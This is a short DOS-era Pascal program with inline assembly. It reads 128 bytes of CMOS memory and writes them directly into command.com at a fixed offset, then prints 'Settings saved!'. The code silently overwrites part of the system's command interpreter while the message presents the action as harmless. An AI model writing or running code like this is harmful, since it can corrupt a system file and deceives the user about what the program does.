  var
    F: file;
    i: word;
    x: byte;
begin
  Assign(F, 'command.com');
  Reset(F, 1);
  Seek(F, $5050);
  for i := 0 to 127 do
  begin
    asm
      xor cx,cx
      mov ax,i
      out 70h,al
@@:   loop @@
      in al,71h
      mov x,al
    end;
    BlockWrite(F, x, 1);
  end;
  Writeln('Settings saved!');
end.